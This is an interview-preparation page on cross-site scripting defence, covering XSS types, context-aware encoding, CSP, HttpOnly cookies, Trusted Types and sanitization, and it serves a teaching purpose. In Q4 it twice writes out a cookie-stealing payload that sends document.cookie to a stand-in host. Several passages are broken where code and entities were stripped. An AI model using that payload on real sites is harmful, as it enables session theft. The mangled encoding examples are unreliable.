title: 22. Interview: XSS (Cross-Site Scripting)

sections.title: Conceptual Interview Questions
sections.body:
### Q1. What are the three types of XSS, and how do they differ? **Answer:** The three types are stored, reflected, and DOM-based XSS. **Stored (persistent) XSS** is when the attacker's payload is saved on the server (in a database, comment, profile bio, chat message) and served to every user who views the page — it's the most damaging because a single injection can compromise many victims automatically. The Samy worm (2005) on MySpace is the canonical example: it infected over one million users in 20 hours by self-propagating through stored profile bios. **Reflected (non-persistent) XSS** is when the payload is included in the victim's request (typically a URL parameter) and reflected back in the response without being stored — each victim must be individually targeted via a phishing link, so it's less damaging but more common. **DOM-based XSS** is when the payload never goes to the server: it's processed entirely in the browser by client-side JavaScript that reads from `location.hash` or `location.search` and writes to `innerHTML` or `document.write`. The server's response is identical for every request, making DOM-based XSS harder to detect with server-side WAFs and scanners. Each type requires slightly different mitigations: stored/reflected are prevented by output encoding on the server; DOM-based is prevented by avoiding dangerous DOM sinks (`innerHTML`, `eval`, `document.write`) and using `textContent` or `setHTML` instead. **Visual:** ``` STORED: attacker -> DB stores payload -> every viewer executes it (Samy worm, 1M users in 20h) REFLECTED: victim clicks link ?q= server reflects it back, only that victim executes DOM-BASED: victim clicks link # server returns same HTML for all; client JS reads hash, writes to innerHTML -> script runs ``` ### Q2. What is output encoding and why must it be context-aware? **Answer:** Output encoding is the practice of converting special characters in user-supplied data to their HTML entity equivalents before writing them into a response, so the browser renders them as visible text rather than interpreting them as HTML or JavaScript. The basic HTML body encoding escapes `<`, `>`, `&`, `"`, `'` to `<`, `>`, `&`, `"`, `'`. But encoding must match the context where the data will be placed: in an HTML attribute (e.g., `value=""`), you must escape quotes; in a JavaScript string (e.g., `var name = "";`), you must escape quotes, backslashes, and crucially `` (which can break out of a `` from breaking out. Modern frameworks (React, Vue, Angular) auto-escape for the HTML body context by default; for other contexts, you must use the framework's context-aware encoding or a library like DOMPurify. **Visual:** ``` HTML body context:

{user_input}

encode: < > & " ' -> < > & " ' HTML attr context: encode: " ' < > & (always quote attributes) JS string context: encode: " \ / and (use JSON.stringify + \\u003c) URL context: reject javascript:, data:, vbscript: schemes then encodeURIComponent on params CSS context:
encode: \ ( ) ; : (or avoid user input in CSS entirely) ``` ### Q3. What is Content Security Policy (CSP) and how does it mitigate XSS? **Answer:** CSP is a response header (`Content-Security-Policy`) that tells the browser which sources of script, style, image, font, frame, and other resources are allowed to load and execute on the page. A strict CSP like `script-src 'self'` blocks inline scripts (no ` browser: loads and executes it (XSS succeeds) strict CSP: script-src 'self' 'nonce-XYZ' 'strict-dynamic' attacker injects (no nonce) BLOCKED attacker injects (nonce match) OK rollout: Content-Security-Policy-Report-Only: ...; report-to /csp-reports -> collect violations to /csp-reports endpoint -> fix legitimate violations (move inline to external, add nonces) -> switch to Content-Security-Policy (enforce) once violations = 0 ``` ### Q4. Why are HttpOnly cookies important for XSS defense? **Answer:** `HttpOnly` is a cookie attribute that tells the browser not to expose the cookie to JavaScript — `document.cookie` returns only non-HttpOnly cookies, so an attacker's injected script cannot read an HttpOnly cookie. This is critical because cookie theft is the most common XSS impact: an attacker who can run `fetch('https://evil.com/?c=' + document.cookie)` exfiltrates the victim's session cookie and can take over the account. With `HttpOnly`, the session cookie is invisible to JavaScript, so even if XSS executes, the attacker cannot steal the session token directly. The cookie is still sent on legitimate authenticated requests (the browser auto-attaches it), so the user's session continues to work. `HttpOnly` is not a complete defense — an XSS script can still make authenticated requests as the victim (the browser attaches the cookie), deface the page, or pivot to other attacks — but it eliminates the easiest and most common XSS impact. Pair with `Secure` (cookie only sent over HTTPS), `SameSite=Lax` (limits cross-site sending), and `__Host-` prefix (requires Secure, Path=/, no Domain attribute, preventing subdomain-based cookie injection). Every session or auth cookie should have `HttpOnly; Secure; SameSite=Lax` as the default. The only cookies that should NOT be HttpOnly are non-sensitive UI preferences that JavaScript needs to read (e.g., "dark mode" — though even this can be a server-rendered setting). **Visual:** ``` no HttpOnly: attacker XSS: fetch('https://evil.com/?c=' + document.cookie) -> sends session=abc123 to evil.com -> attacker uses session=abc123 to take over account HttpOnly cookie: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax attacker XSS: document.cookie -> returns "" (or only non-HttpOnly cookies) -> session cookie is invisible, can't be stolen -> but attacker can still make authenticated requests as victim (browser attaches cookie on fetch() to same origin) -> so HttpOnly is necessary but not sufficient ``` ### Q5. What is Trusted Types and how does it differ from CSP? **Answer:** Trusted Types is a browser API (W3C draft, supported in Chrome) that requires all DOM sinks that can execute scripts or alter the DOM dangerously — `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `Function()`, and many others — to receive a `TrustedHTML`, `TrustedScript`, or `TrustedScriptURL` object instead of a raw string. Raw strings are rejected, breaking the most common DOM-based XSS patterns at the browser level. To create a TrustedHTML, the application must define a policy (via `trustedTypes.createPolicy`) that accepts a string and returns sanitized HTML — typically wrapping DOMPurify. The policy is the only place where raw strings are converted to trusted types, so the entire application's XSS surface collapses to the policy's sanitization logic. Google deployed Trusted Types across their internal applications and reported a ~70% reduction in XSS incidents. The difference from CSP: CSP restricts where scripts can load from (origin allowlist + nonces), but doesn't prevent DOM sinks from being called with attacker-controlled strings — a same-origin script that calls `innerHTML = userInput` still executes the injected script under CSP. Trusted Types blocks the sink call itself. They are complementary: CSP restricts script loading, Trusted Types restricts DOM sinks. The trade-off: adopting Trusted Types requires refactoring every DOM sink in the application to use a policy, which is a significant migration for legacy apps — typically done with `Content-Security-Policy: require-trusted-types-for 'script'` enforced gradually with report-only mode first. **Visual:** ``` without Trusted Types: el.innerHTML = userInput // script runs (XSS) eval(userInput) // script runs (XSS) document.write(userInput) // script runs (XSS) with Trusted Types (require-trusted-types-for 'script'): el.innerHTML = userInput // REJECTED (not a TrustedHTML) el.innerHTML = policy.createHTML(userInput) // OK (policy sanitized) policy = trustedTypes.createPolicy('sanitize', { createHTML: s => DOMPurify.sanitize(s) }) CSP vs Trusted Types: CSP: restricts script SOURCES (origin/nonce) Trusted Types: restricts script SINKS (DOM mutation points) -> complementary, layer both ``` ### Q6. How do you safely render rich text (Markdown, HTML) from user input? **Answer:** Rich text is a perennial XSS source because the application must allow some HTML (for formatting) but block dangerous tags and attributes. The safe pattern has four layers. First, prefer Markdown over HTML — Markdown is a constrained format that the renderer converts to a known-safe HTML subset, so the user never provides raw HTML. Most Markdown renderers (marked, markdown-it, Python-Markdown) have options to disable raw HTML pass-through (`sanitize: true` or `html: false`). Second, if raw HTML must be allowed (e.g., a rich-text editor), sanitize with a well-maintained library — DOMPurify in the browser, `bleach` or `nh3` in Python, `sanitize-html` in Node. These libraries parse the HTML, allowlist a safe subset of tags and attributes, strip event handlers (`onclick`, `onerror`), strip dangerous URLs (`javascript:`, `data:`), and handle edge cases like mXSS (mutation XSS, where the browser's HTML parser mutates the sanitized HTML into a dangerous form on re-serialization). Third, enforce a strict CSP with nonces — even if sanitization is bypassed (mXSS, library bug, new attack vector), the CSP blocks the injected script from executing. sections.title: Scenario-Based Interview Questions
sections.body: ### Q1. Your company's product has a comment box that allows HTML for formatting. A security researcher reports they executed JavaScript via a comment. How do you respond? **Answer:** Immediate response: take the affected comment offline (delete or hide it from production), confirm the vulnerability reproduces (ask the researcher for the exact payload), and patch the rendering pipeline. The patch is layered: (1) sanitize all comment HTML with DOMPurify on the server before storing (and again on read, in case old comments contain payloads that bypass older sanitizers) — configure DOMPurify with a strict allowlist of tags (b, i, em, strong, a, p, br, ul, li, code) and attributes (a.href only), strip all event handlers (`onclick`, `onerror`, etc.), and reject dangerous URL schemes (`javascript:`, `data:`, `vbscript:`). (2) Switch to Markdown input instead of raw HTML — Markdown with `html: false` eliminates the raw-HTML attack surface entirely; users get formatting (bold, links, lists) without being able to inject arbitrary HTML. (3) Deploy a strict CSP with nonces so even if sanitization is bypassed (DOMPurify mXSS bug, new attack vector), the injected script cannot execute. (4) Render comments in a sandboxed iframe so a successful XSS is contained (no access to parent cookies or DOM). (5) Scan all existing comments for known XSS payloads (regex for `alert(1)` and asserts it doesn't execute, and run an annual third-party penetration test that includes XSS specifically. **Visual:** ``` IMMEDIATE: 1. hide/delete the malicious comment 2. reproduce (ask researcher for payload) 3. patch: DOMPurify on server before store + on read LONG-TERM (layered): input: Markdown (html:false) -> eliminates raw HTML surface render: DOMPurify.sanitize(html, {ALLOWED_TAGS: [...]}) -> strips script, on* attrs, javascript: URLs CSP: script-src 'nonce-XYZ' 'strict-dynamic' -> blocks injected scripts even if sanitization fails sandbox: render comments in
